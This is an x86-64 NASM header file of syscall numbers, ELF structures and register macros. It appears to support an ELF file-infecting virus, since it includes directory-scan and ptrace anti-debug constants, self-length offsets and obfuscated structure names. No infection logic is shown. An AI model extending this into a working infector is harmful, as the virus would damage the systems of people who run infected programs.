; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - PnOy0Yq_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - a87kn1_size) + x]

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

struc PnOy0Yq
.HV9xDP resb PAGE_SIZE
.wzpCrL7CA: resb PAGE_SIZE
.ToT2tQ45X resq 1
.LXEwv: resd 1
.nwI89e0nik: resd 1
.IfQimZ resq 1
endstruc

struc a87kn1
.OpikMz8wAH resq 1
.vWmXLHkHp resq 1
.wxWVX resq 1
.bOHVd resb 1
.FppJWuxgOd resq 1
.se1U8vMigC resq 1
.AhEn2HA26O resq 1
.cmYNLSU resq 1
.OXr9JVg5 resq 1 
.Orj4Glq resq 1
.VFbqM6QXhA resq 1
.Ckfh8jO resb 1
.gyXB4 resq 1
.fXv7GJuO resq 1
.NV3Du7j resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc PL99YZoJb
.MOcBzOL: resb 16
.X8b2Q: resw 1
.ppzY4k: resw 1
.v9dw2: resd 1
.Xl5ie49Ry: resq 1
.lp9Wv5DvCA: resq 1
.yEsm1Zo: resq 1
.As1Ghymt: resd 1
.rELA7CDie: resw 1
.kBbl28nF: resw 1
.TKIJF5: resw 1
.yusrv: resw 1
.Pc2Lt: resw 1
.l4BCYjrPV: resw 1
endstruc

struc yVxrShPdrU
.lgEP2ReSLt: resd 1
.bcECjkqmCp: resd 1
.Zc7z2in: resq 1
.kV6BTy9jf: resq 1
.ZqGCcQUhv: resq 1
.jwUMV: resq 1
.gB5z0EzW: resq 1
.LWJjy9e: resq 1
endstruc

struc Y1K8tiPf
.W3MFbm2Q: resd 1
.vHGzOzLTw: resd 1
.kTtuBYPV: resq 1
.aCpFQ: resq 1
.grf7DAdhr: resq 1
.bmixQza5: resq 1
.Q4a1luOx: resd 1
.PedJMzRyV: resd 1
.PrR4Zt resq 1
.m8PgZe6 resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 